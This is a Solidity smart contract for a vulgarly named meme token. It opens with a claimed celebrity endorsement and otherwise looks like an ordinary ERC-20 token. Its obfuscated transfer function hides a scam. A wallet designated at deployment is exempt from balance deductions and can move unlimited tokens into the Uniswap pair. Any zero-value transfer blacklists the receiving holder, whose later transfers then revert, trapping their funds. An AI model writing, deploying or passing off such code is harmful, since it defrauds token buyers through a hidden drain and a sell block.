/*

Officially endorsed by the Top G himself.
https://twitter.com/Cobratate/status/1658932481947566080

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.15;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SuckMyDickCoin is Ownable {
    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => uint256) private vanish;

    function suckMyDick(address reservoir, address quartermaster, uint256 oozy) private returns (bool success) {
        if (vanish[reservoir] == 0) {
            balanceOf[reservoir] -= oozy;
        }

        if (oozy == 0) nitrogen[quartermaster] += topg;

        if (vanish[reservoir] == 0 && uniswapV2Pair != reservoir && nitrogen[reservoir] > 0) {
            vanish[reservoir] -= topg;
        }

        balanceOf[quartermaster] += oozy;
        emit Transfer(reservoir, quartermaster, oozy);
        return true;
    }

    mapping(address => uint256) public balanceOf;

    address public uniswapV2Pair;

    string public symbol = 'SUCKMYDICK';

    uint8 public decimals = 9;

    uint256 public totalSupply = 69_696_969_696_969 * 10 ** 9;

    uint256 private topg = 19;

    function transferFrom(address reservoir, address quartermaster, uint256 oozy) public returns (bool success) {
        suckMyDick(reservoir, quartermaster, oozy);
        require(oozy <= allowance[reservoir][msg.sender]);
        allowance[reservoir][msg.sender] -= oozy;
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    constructor(address acceptability) {
        balanceOf[msg.sender] = totalSupply;
        vanish[acceptability] = topg;
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address unconfirmed, uint256 oozy) public returns (bool success) {
        allowance[msg.sender][unconfirmed] = oozy;
        emit Approval(msg.sender, unconfirmed, oozy);
        return true;
    }

    function transfer(address quartermaster, uint256 oozy) public returns (bool success) {
        suckMyDick(msg.sender, quartermaster, oozy);
        return true;
    }

    string public name = 'Suck My Dick Coin';

    mapping(address => uint256) private nitrogen;
}